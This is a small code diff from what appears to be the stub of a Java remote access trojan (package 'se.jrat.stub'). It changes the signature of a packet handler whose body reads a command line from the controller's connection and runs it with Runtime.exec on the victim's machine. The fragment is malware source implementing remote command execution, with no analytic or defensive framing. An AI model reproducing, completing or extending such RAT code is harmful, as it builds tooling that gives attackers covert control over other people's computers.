@@ -9,7 +9,7 @@ import se.jrat.stub.Connection;
 public class Packet38RunCommand extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String process = Connection.instance.readLine();
 		try {
 			Runtime.getRuntime().exec(process);
